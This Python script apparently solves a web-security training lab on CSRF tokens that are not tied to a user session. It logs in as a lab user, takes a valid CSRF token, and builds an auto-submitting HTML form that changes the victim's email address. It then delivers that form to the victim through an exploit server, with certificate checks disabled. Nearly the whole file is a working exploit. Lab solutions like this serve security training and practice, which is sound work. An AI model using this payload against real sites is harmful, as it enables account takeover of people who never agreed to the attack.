import requests
import re
import urllib3
from colorama import Fore


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "CSRF where token is not tied to user session"


def post_data(url, data, cookies=None, allow_redirects=True):
    try:
        return requests.post(url, data=data, cookies=cookies, allow_redirects=allow_redirects, verify=False)
    except Exception as e:
        print(f"[!] Failed to post data: {e}")
        return None


def run(url, payload, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the login page\n2. Extract the csrf to login\n3. Login as wiener\n4. Fetch wiener profile\n5. Extract the csrf token that is needed for email update\n6. Craft an HTML form for changing the email address with an auto-submit script and include the extracted csrf token in the form\n7. Deliver the exploit to the victim\n8. The victim's email will be changed after they trigger the exploit\n""")

    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    try:
        # Step 1: Login as wiener
        r = session.get(url.rstrip('/') + "/login")
        csrf_token = re.search(r'name="csrf" value="(.+?)"', r.text).group(1)
        session_cookie = r.cookies.get("session")

        login_data = {
            "username": "wiener",
            "password": "peter",
            "csrf": csrf_token
        }
        cookies = {
            "session": session_cookie
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }

        r = session.post(url.rstrip('/') + "/login",
                         data=login_data, cookies=cookies, headers=headers)

        # Step 2: Fetch /my-account to get new CSRF token
        r = session.get(url.rstrip('/') + "/my-account")
        csrf_token = re.search(r'name="csrf" value="(.+?)"', r.text).group(1)

        # Step 3: Ask for exploit server URL
        exploit_server = input(
            "[?] Enter the exploit server URL: ").strip().rstrip('/')

        url=url.rstrip('/')
        # Step 4: Build and deliver exploit
        new_email = "mystic_mido@mystic_mido.com"
        payload = f"""<html>
                    <body>
                    <form action="{url}/my-account/change-email" method="POST">
                        <input type="hidden" name="email" value="{new_email}" />
                        <input type="hidden" name="csrf" value="{csrf_token}" />
                        <input type="submit" value="Submit request" />
                    </form>
                    <script>
                        document.forms[0].submit();
                    </script>
                    </body>
                </html>"""

        exploit_data = {
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "responseBody": payload,
            "formAction": "DELIVER_TO_VICTIM",
            "urlIsHttps": "on",
            "responseFile": "/exploit"
        }

        res = post_data(exploit_server + "/", exploit_data)
        if res and res.status_code == 200:
            print("[+] Exploit delivered successfully!")
            return True
        else:
            print("[-] Exploit delivery failed.")
            return False

    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        return False
